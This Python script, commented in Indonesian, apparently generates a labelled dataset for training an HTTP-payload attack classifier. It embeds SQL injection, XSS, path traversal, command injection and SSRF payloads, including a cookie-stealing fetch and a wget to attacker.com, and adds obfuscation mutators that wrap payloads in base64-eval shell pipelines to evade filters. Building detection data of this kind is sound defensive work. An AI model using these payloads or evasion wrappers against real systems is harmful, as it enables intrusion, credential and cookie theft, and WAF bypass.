import os
import json
import random
import base64
import time

# Output paths
DATASET_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dataset")
OUTPUT_FILE = os.path.join(DATASET_DIR, "cyber_security_dataset.json")

# Instructions
INSTRUCTION_TEXT = "Lakukan klasifikasi payload HTTP ini. Tentukan status (BENIGN, SUSPICIOUS, MALICIOUS), tipe serangan (SQL_INJECTION, CROSS_SITE_SCRIPTING, PATH_TRAVERSAL, COMMAND_INJECTION, ZERO_DAY_BYPASS, NONE), dan threat score."

# ------------------------------------------------------------------------------
# 1. ADVERSARIAL MUTATORS (Obfuscation Generators)
# ------------------------------------------------------------------------------

def mutate_double_url_encode(payload):
    """Mengubah karakter non-alphanumeric menjadi double percent-encoded."""
    res = ""
    for c in payload:
        if c.isalnum() or c in ['-', '_', '.', '~']:
            res += c
        else:
            # First encode: %XX -> Second encode % -> %25XX
            res += f"%25{ord(c):02X}"
    return res

def mutate_base64_nest(payload):
    """Menyisipkan payload ke dalam pembungkus evaluasi Base64."""
    b64_str = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    templates = [
        f"eval(base64_decode('{b64_str}'))",
        f"sh -c 'echo {b64_str} | base64 -d | sh'",
        f"python -c \"import base64; exec(base64.b64decode('{b64_str}'))\"",
        f"<?php eval(base64_decode('{b64_str}')); ?>"
    ]
    return random.choice(templates)

def mutate_unicode_normalization(payload):
    """Mengganti beberapa karakter dengan escape sequence unicode."""
    res = ""
    for c in payload:
        if c.isalpha() and random.random() > 0.4:
            res += f"\\u{ord(c):04x}"
        else:
            res += c
    return res

def mutate_parameter_pollution(payload, param_name="id"):
    """Duplikasi parameter HTTP untuk memicu HTTP Parameter Pollution (HPP)."""
    return f"{param_name}=1&{param_name}={payload}"

def mutate_sql_hex(payload):
    """Mengubah string payload menjadi format heksadesimal SQL."""
    hex_val = "".join(f"{ord(c):02x}" for c in payload)
    return f"0x{hex_val}"

def mutate_mixed_case_comments(payload):
    """Mengacak kapitalisasi kata kunci siber dan menyisipkan inline comments."""
    res = ""
    for c in payload:
        if c.isalpha():
            res += c.upper() if random.random() > 0.5 else c.lower()
        else:
            res += c
            
    # Sisipkan inline comments di antara spasi
    comments = ["/**/", "/*!50000*/", "/*nexus*/"]
    res = res.replace(" ", random.choice(comments))
    
    # Mutasi kata kunci SQL
    sql_keywords = ["UNION", "SELECT", "INSERT", "DELETE", "UPDATE", "WHERE", "FROM"]
    for word in sql_keywords:
        if word.lower() in res.lower():
            mixed_word = "".join(l.upper() if random.random() > 0.5 else l.lower() for l in word)
            res = res.replace(word, mixed_word + random.choice(comments))
            res = res.replace(word.lower(), mixed_word + random.choice(comments))
            
    return res

def apply_random_mutation(payload):
    """Memilih pemutasi acak untuk payload serangan."""
    mutators = [
        mutate_double_url_encode,
        mutate_base64_nest,
        mutate_unicode_normalization,
        mutate_sql_hex,
        mutate_mixed_case_comments
    ]
    mutator = random.choice(mutators)
    try:
        return mutator(payload)
    except Exception:
        return payload

# ------------------------------------------------------------------------------
# 2. COMPLEX BENIGN GENERATORS (GraphQL, Nested JSON/XML, JWT Headers)
# ------------------------------------------------------------------------------

def generate_jwt_token():
    """Membuat JWT palsu dengan struktur klaim standar JWT."""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": f"usr_{random.randint(10000, 99999)}",
        "name": f"Client_User_{random.randint(10, 99)}",
        "role": random.choice(["user", "admin", "moderator"]),
        "iat": int(time.time()) - 100,
        "exp": int(time.time()) + 3600
    }
    
    def b64url(d):
        s = base64.urlsafe_b64encode(json.dumps(d).encode('utf-8')).decode('utf-8')
        return s.replace("=", "")
        
    signature = "dummy_signature_hash_bytes_validation_key_value"
    return f"{b64url(header)}.{b64url(payload)}.{signature}"

def generate_complex_benign(count=1000):
    """Menghasilkan dataset benign (normal) yang kompleks."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
    ]
    
    samples = []
    
    # GraphQL benign
    for i in range(count // 3):
        jwt = generate_jwt_token()
        ua = random.choice(user_agents)
        queries = [
            {"query": "query GetUserProfile($id: ID!) { user(id: $id) { name email profilePicture } }", "variables": {"id": f"usr_{random.randint(10000,99999)}"}},
            {"query": "mutation UpdateSettings($theme: String!) { updateSettings(theme: $theme) { success message } }", "variables": {"theme": "dark"}},
            {"query": "query SearchProducts($text: String!, $limit: Int) { products(search: $text, limit: $limit) { id name price } }", "variables": {"text": "nexus-shield", "limit": 10}}
        ]
        body = json.dumps(random.choice(queries))
        input_payload = f"POST /graphql HTTP/1.1\nHost: target-portfolio.local\nUser-Agent: {ua}\nAuthorization: Bearer {jwt}\nContent-Length: {len(body)}\nContent-Type: application/json\n\n{body}"
        
        output_payload = {
            "status": "BENIGN",
            "threat_score": round(random.uniform(0.00, 0.05), 2),
            "attack_type": "NONE",
            "reason": "Request GraphQL normal terotentikasi dengan token JWT valid."
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload,
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
        
    # Nested XML & JSON
    for i in range(count // 3):
        ua = random.choice(user_agents)
        if random.random() > 0.5:
            # Nested JSON
            body = json.dumps({
                "transaction": {
                    "id": f"tx_{random.randint(10000000, 99999999)}",
                    "amount": round(random.uniform(10.0, 5000.0), 2),
                    "currency": "IDR",
                    "items": [
                        {"name": "Nexus WAF License Starter", "quantity": 1, "price": 1000.00},
                        {"name": "Support Contract", "quantity": 1, "price": 500.00}
                    ]
                },
                "customer": {
                    "name": f"User_{random.randint(100,999)}",
                    "address": "Jalan Sudirman No. 12, Jakarta"
                }
            })
            input_payload = f"POST /api/checkout HTTP/1.1\nHost: target-portfolio.local\nUser-Agent: {ua}\nContent-Type: application/json\nContent-Length: {len(body)}\n\n{body}"
        else:
            # XML
            body = f'''<?xml version="1.0" encoding="UTF-8"?>
<document>
    <meta>
        <version>2.1</version>
        <client>Nexus-Agent-Web</client>
    </meta>
    <data>
        <content><![CDATA[Data transaksi aman {random.randint(100,999)}]]></content>
        <timestamp>{int(time.time())}</timestamp>
    </data>
</document>'''
            input_payload = f"POST /api/xml-processor HTTP/1.1\nHost: target-portfolio.local\nUser-Agent: {ua}\nContent-Type: application/xml\nContent-Length: {len(body)}\n\n{body}"
            
        output_payload = {
            "status": "BENIGN",
            "threat_score": round(random.uniform(0.00, 0.08), 2),
            "attack_type": "NONE",
            "reason": "Request payload terstruktur (JSON/XML) normal dengan struktur data aman."
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload,
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
        
    # Standard Web Pages & API calls
    for i in range(count - len(samples)):
        paths = ["/", "/about", "/contact", "/portfolio", "/gallery", "/api/photos", "/assets/logo.png", "/favicon.ico"]
        path = random.choice(paths)
        ua = random.choice(user_agents)
        input_payload = f"GET {path} HTTP/1.1\nHost: target-portfolio.local\nUser-Agent: {ua}\n"
        output_payload = {
            "status": "BENIGN",
            "threat_score": round(random.uniform(0.00, 0.05), 2),
            "attack_type": "NONE",
            "reason": "Request GET standar untuk memuat halaman web statis."
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload.strip(),
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
        
    return samples

# ------------------------------------------------------------------------------
# 3. ATTACK VECTORS GENERATION (With Mutation Options)
# ------------------------------------------------------------------------------

def generate_sqli_adversarial(count=200):
    base_payloads = [
        "1' OR '1'='1",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' UNION SELECT NULL, NULL, username, password FROM users--",
        "1; DROP TABLE logs;--",
        "1' OR sleep(5) OR '1",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))AND)--",
        "1' UNION ALL SELECT NULL, version(), user()--",
        "' OR 1=1 LIMIT 1 --",
        "1' AND 1=2 UNION SELECT 1,username,password FROM admin--"
    ]
    
    samples = []
    for i in range(count):
        p = random.choice(base_payloads)
        # Apply mutation in 70% of cases
        is_mutated = False
        if random.random() > 0.3:
            p = apply_random_mutation(p)
            is_mutated = True
            
        # Parameter Pollution wrapper
        input_payload = f"POST /api/login HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\n\nusername={p}&password=securepass123"
        
        reason = f"Mendeteksi pola SQL Injection (SQLi) '{p[:30]}...' untuk memanipulasi kueri basis data backend."
        if is_mutated:
            reason = f"Mendeteksi SQL Injection terobfuskasi (Zero-Day/Bypass Variant) '{p[:40]}...' dengan bypass tanda tangan regex."
            
        output_payload = {
            "status": "MALICIOUS",
            "threat_score": round(random.uniform(0.92, 1.00), 2),
            "attack_type": "SQL_INJECTION",
            "reason": reason
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload,
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
    return samples

def generate_xss_adversarial(count=200):
    base_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert('XSS')>",
        "javascript:alert(1)",
        "\"><script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
        "<body onload=prompt(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>"
    ]
    
    samples = []
    for i in range(count):
        p = random.choice(base_payloads)
        is_mutated = False
        if random.random() > 0.3:
            p = apply_random_mutation(p)
            is_mutated = True
            
        input_payload = f"GET /search?q={p} HTTP/1.1\nHost: target.local\nUser-Agent: Mozilla/5.0"
        
        reason = f"Mendeteksi payload Cross-Site Scripting (XSS) '{p[:30]}...' yang mencoba menyisipkan skrip browser korban."
        if is_mutated:
            reason = f"Mendeteksi variasi XSS terobfuskasi (Zero-Day/Bypass Variant) '{p[:40]}...' untuk mem-bypass filter parser."
            
        output_payload = {
            "status": "MALICIOUS",
            "threat_score": round(random.uniform(0.90, 0.99), 2),
            "attack_type": "CROSS_SITE_SCRIPTING",
            "reason": reason
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload,
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
    return samples

def generate_path_traversal_adversarial(count=200):
    base_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/var/www/html/../../../../etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../var/log/nginx/access.log"
    ]
    
    samples = []
    for i in range(count):
        p = random.choice(base_payloads)
        is_mutated = False
        if random.random() > 0.4:
            # Perform double URL encoding or parameters pollution manually
            p = mutate_double_url_encode(p)
            is_mutated = True
            
        input_payload = f"GET /api/download?file={p} HTTP/1.1\nHost: target.local\n"
        
        reason = f"Mendeteksi upaya Path Traversal / LFI '{p}' yang mencoba mengakses berkas sensitif internal sistem."
        if is_mutated:
            reason = f"Mendeteksi Path Traversal terenkode ganda (Zero-Day/Bypass Variant) '{p}' untuk mengelak dari pembatasan path WAF."
            
        output_payload = {
            "status": "MALICIOUS",
            "threat_score": round(random.uniform(0.93, 1.00), 2),
            "attack_type": "PATH_TRAVERSAL",
            "reason": reason
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload.strip(),
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
    return samples

def generate_command_injection_adversarial(count=200):
    base_payloads = [
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 & id",
        "127.0.0.1 && wget http://attacker.com/shell.sh",
        "|| id ||",
        "`id`",
        "$(whoami)",
        "| ping -c 5 8.8.8.8 |",
        "&& powershell.exe -Command Get-Process"
    ]
    
    samples = []
    for i in range(count):
        p = random.choice(base_payloads)
        is_mutated = False
        if random.random() > 0.4:
            p = mutate_base64_nest(p)
            is_mutated = True
            
        input_payload = f"POST /api/ping HTTP/1.1\nHost: target.local\nContent-Type: application/json\n\n{{\"ip\": \"{p}\"}}"
        
        reason = f"Mendeteksi Command Injection (RCE) '{p[:30]}...' yang mencoba menyisipkan perintah OS langsung ke shell server."
        if is_mutated:
            reason = f"Mendeteksi Command Injection terselubung (Zero-Day/Bypass Variant) '{p[:40]}...' menggunakan sarana eksekusi interpreter pihak ketiga."
            
        output_payload = {
            "status": "MALICIOUS",
            "threat_score": round(random.uniform(0.95, 1.00), 2),
            "attack_type": "COMMAND_INJECTION",
            "reason": reason
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload,
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
    return samples

def generate_zeroday_bypass_adversarial(count=200):
    base_payloads = [
        # Double URL encoded SQLi
        "%2531%2527%2520%254f%2552%2520%252531%25253d%252531",
        # SQLi using nested inline comments
        "1'/*!50000union*//*!50000select*/1,username,password/**/from/**/users--",
        # XSS using mathematical homoglyphs
        "<math><mi//href=\"javascript:alert(1)\">CLICK",
        # XSS using JS non-alphanumeric bypass (JSFuck)
        "[(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]]()",
        # Polyglot injection
        "jaVasCript:/*-/*`/*\\`/*'/*\"/*\"/**/((e)=>{})//</script><svg/onload=alert(1)>",
        # Command injection path expansion bypass
        ";$u $g; ${PATH:0:1}bin${PATH:0:1}sh",
        # SSRF metadata service target
        "http://169.254.169.254/latest/meta-data/local-hostname",
        "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
        # Localhost decimal bypass
        "http://2130706433/etc/passwd",
        # Serialization injection
        "O:8:\"Database\":2:{s:2:\"db\";s:9:\"localhost\";s:4:\"query\";s:15:\"DROP TABLE logs\";}"
    ]
    
    samples = []
    for i in range(count):
        p = random.choice(base_payloads)
        # Apply mutations to standard zero-days as well to make it even more obfuscated
        if random.random() > 0.5:
            p = mutate_unicode_normalization(p)
            
        input_payload = f"POST /api/gateway-processor HTTP/1.1\nHost: critical-core.nexus.local\nContent-Type: text/plain\n\n{p}"
        output_payload = {
            "status": "MALICIOUS",
            "threat_score": round(random.uniform(0.97, 1.00), 2),
            "attack_type": "ZERO_DAY_BYPASS",
            "reason": f"Mendeteksi ancaman siber mutasi tingkat tinggi / Zero-Day WAF Bypass '{p[:40]}...' yang mengecoh detektor parser tradisional."
        }
        samples.append({
            "instruction": INSTRUCTION_TEXT,
            "input": input_payload,
            "output": json.dumps(output_payload, ensure_ascii=False)
        })
    return samples

# ------------------------------------------------------------------------------
# 4. MAIN PIPELINE EXECUTION
# ------------------------------------------------------------------------------

def main():
    print("[NEX-AI] Memulai proses Peningkatan Kualitas Dataset (Adversarial & Benign Enrichment)...")
    
    all_samples = []
    
    # 1. Tambah data Benign (normal) - Porsi paling besar untuk mengurangi false positives (Total 1000 sampel)
    benign_samples = generate_complex_benign(1000)
    all_samples.extend(benign_samples)
    print(f"[NEX-AI] Terbentuk {len(benign_samples)} sampel benign (termasuk GraphQL, XML, JSON, dan JWT).")
    
    # 2. Tambah data SQLi (200 sampel)
    sqli_samples = generate_sqli_adversarial(200)
    all_samples.extend(sqli_samples)
    print(f"[NEX-AI] Terbentuk {len(sqli_samples)} sampel SQLi (termasuk adversarial mutations).")
    
    # 3. Tambah data XSS (200 sampel)
    xss_samples = generate_xss_adversarial(200)
    all_samples.extend(xss_samples)
    print(f"[NEX-AI] Terbentuk {len(xss_samples)} sampel XSS (termasuk adversarial mutations).")
    
    # 4. Tambah data Path Traversal (200 sampel)
    traversal_samples = generate_path_traversal_adversarial(200)
    all_samples.extend(traversal_samples)
    print(f"[NEX-AI] Terbentuk {len(traversal_samples)} sampel Path Traversal (termasuk double URL encode).")
    
    # 5. Tambah data Command Injection (200 sampel)
    cmd_samples = generate_command_injection_adversarial(200)
    all_samples.extend(cmd_samples)
    print(f"[NEX-AI] Terbentuk {len(cmd_samples)} sampel Command Injection (termasuk base64 wraps).")
    
    # 6. Tambah data Zero-Day / Bypass (200 sampel)
    bypass_samples = generate_zeroday_bypass_adversarial(200)
    all_samples.extend(bypass_samples)
    print(f"[NEX-AI] Terbentuk {len(bypass_samples)} sampel Zero-Day Bypass.")
    
    # Acak susunan sampel secara global
    random.shuffle(all_samples)
    
    # Buat direktori jika belum ada
    os.makedirs(DATASET_DIR, exist_ok=True)
    
    # Tulis ke file JSON
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        json.dump(all_samples, f, indent=2, ensure_ascii=False)
        
    print(f"[NEX-AI] Dataset SUKSES ditingkatkan! Total sampel: {len(all_samples)}")
    print(f"[NEX-AI] Berkas tersimpan di: {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
